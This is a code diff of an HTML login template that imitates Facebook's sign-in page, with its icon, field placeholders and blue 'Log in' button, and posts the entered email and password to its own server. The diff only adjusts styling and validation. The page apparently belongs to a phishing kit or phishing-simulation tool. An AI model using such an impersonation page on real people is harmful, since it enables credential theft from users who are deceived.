@@ -1,6 +1,6 @@
 {% extends "base.html" %}
 {% block body %}
-<div class="card" style="max-width:520px;margin:28px auto">
+<div class="card" style="max-width:520px;margin:28px auto;position:relative;">
   <div class="platform-header">
     <div class="icon-circle bg-facebook">
       <i class="fa-brands fa-facebook icon-lg"></i>
@@ -11,7 +11,7 @@
     </div>
   </div>
 
-  <form id="loginForm" method="post" style="display:flex;flex-direction:column;gap:8px;margin-top:18px;">
+  <form id="loginForm" method="post" style="display:flex;flex-direction:column;gap:6px;margin-top:12px;">
     <div style="display:flex;flex-direction:column;">
       <input 
         class="input"
@@ -20,19 +20,19 @@
         placeholder="Mobile number or email address"
         required
         style="
-          padding:14px 18px;
-          border-radius:50px;
+          padding:13px 18px;
+          border-radius:45px;
           border:1px solid #e5e7eb;
           font-size:15.5px;
           background:#fff;
-          box-shadow:0 6px 16px rgba(2,6,23,0.06);
-          transition:all 0.25s ease;
+          box-shadow:0 4px 14px rgba(2,6,23,0.06);
+          transition:border-color 0.25s ease, box-shadow 0.25s ease;
         "
       >
       <div id="addressError" class="error-text"></div>
     </div>
 
-    <div style="display:flex;flex-direction:column;margin-top:4px;">
+    <div style="display:flex;flex-direction:column;">
       <input 
         class="input"
         id="password"
@@ -41,37 +41,35 @@
         placeholder="Password"
         required
         style="
-          padding:14px 18px;
-          border-radius:50px;
+          padding:13px 18px;
+          border-radius:45px;
           border:1px solid #e5e7eb;
           font-size:15.5px;
           background:#fff;
-          box-shadow:0 6px 16px rgba(2,6,23,0.06);
-          transition:all 0.25s ease;
+          box-shadow:0 4px 14px rgba(2,6,23,0.06);
+          transition:border-color 0.25s ease, box-shadow 0.25s ease;
         "
       >
       <div id="passwordError" class="error-text"></div>
     </div>
 
-    <div class="center" style="margin-top:10px;">
+    <div class="center" style="margin-top:6px;">
       <button 
         class="btn btn-blue" 
         type="submit"
         style="
           width:100%;
           max-width:340px;
-          padding:12px;
-          border-radius:50px;
+          padding:11px;
+          border-radius:45px;
           font-size:15px;
           font-weight:600;
           background:#1877F2;
           color:#fff;
-          box-shadow:0 6px 20px rgba(24,119,242,0.25);
-          transition:all 0.25s ease;
+          box-shadow:0 4px 16px rgba(24,119,242,0.25);
+          transition:background 0.25s ease;
           border:none;
         "
-        onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 10px 24px rgba(24,119,242,0.35)'"
-        onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 6px 20px rgba(24,119,242,0.25)'"
       >
         Log in
       </button>
@@ -82,13 +80,14 @@
 <style>
 .input-error {
   border-color: #ef4444 !important;
-  box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.25) !important;
+  box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.25) !important;
 }
 .error-text {
   color: #ef4444;
   font-size: 13px;
-  margin-top: 4px;
-  min-height: 16px;
+  margin-top: 3px;
+  min-height: 14px;
+  height: 14px;
   transition: opacity 0.25s ease;
 }
 </style>
@@ -101,7 +100,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   const passwordError = document.getElementById("passwordError");
 
   const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
-  const phonePattern = /^\+?\d{6,}$/; // + optional, at least 6 digits
+  const phonePattern = /^\+?\d{6,}$/;
 
   let valid = true;
   [address, password].forEach(input => input.classList.remove("input-error"));
@@ -121,8 +120,6 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
 
   if (!valid) {
     event.preventDefault();
-    const firstError = document.querySelector(".input-error");
-    firstError.scrollIntoView({ behavior: "smooth", block: "center" });
   }
 });
 
